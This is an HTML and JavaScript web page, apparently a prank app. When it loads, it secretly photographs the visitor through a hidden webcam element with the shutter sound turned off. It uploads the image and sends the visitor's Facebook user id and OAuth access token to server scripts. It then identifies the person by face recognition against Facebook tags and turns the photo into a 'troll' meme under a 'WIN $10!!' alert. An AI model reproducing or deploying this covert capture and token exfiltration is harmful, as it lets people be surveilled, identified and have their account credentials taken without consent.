<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
  #cam {
    display:none;
  }
  </style>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
  <script type="text/javascript" src="jpegcam/webcam.js"></script>
  <script type="text/javascript">
  webcam.set_api_url( 'jpegcam/upload.php' );
	webcam.set_quality( 100 );
	webcam.set_shutter_sound( false );
	
  webcam.set_hook( 'onComplete', 'upload_complete' );
	
	function upload_complete(msg) {
	  var file = $.parseJSON(msg);
	  
	  webcam.reset();
		
		FB.getLoginStatus(function(response) {
		  $.post("face_magic.php", {
		    image_url: file.image_url,
		    fb_user_id: response.session.uid,
		    fb_oauth_token: response.session.access_token
		  }, function(data) {
		    var res = $.parseJSON(data);
        var results = res.photos[0].tags[0];
        
        var uid = results.uids[0].uid.replace("@facebook.com","");
        
        FB.api('/' + uid, function(fb_user) {
          hit_twilio(response.session.uid, fb_user.name, file.filename);
        })
		  })
		})
	}
	
	function hit_twilio(fb_user_id, name, filename) {
	  $.post("callback.php", {
      fb_user_id: fb_user_id,
      name: name
    }, function(data) {
      $.post("/a/honeybadger/aviary_magic.php", { filename: filename, troll_name: name }, function(res) {
        var av_magic = $.parseJSON(res);
        if(av_magic.success) {
          memed = av_magic.memed;
          var img = $("<img>").attr("src",memed);
          $("#memed").append(img);
          alert('WIN $10!!');
        }
      });
    });
	}
	
	$(function() {
    // $("#take-pic").click(function() {
    //   webcam.snap();
    // })
	  setTimeout(function() {
	    webcam.snap();
	  }, 2000)
	})
  </script>
</head>
<body>
  
  <div id="cam">
  <script language="JavaScript">
		document.write( webcam.get_html(640, 480) );
  </script>
	</div>
	
	<!-- <button id="take-pic">take pic</button> -->

<br>
<div id="fb-root"></div>
<script>
  window.fbAsyncInit = function() {
    FB.init({appId: '150009015084147', status: true, cookie: true,
             xfbml: true});
  };
  (function() {
    var e = document.createElement('script'); e.async = true;
    e.src = document.location.protocol +
      '//connect.facebook.net/en_US/all.js';
    document.getElementById('fb-root').appendChild(e);
  }());
</script>	
<div id="memed"></div>
</body>
</html>

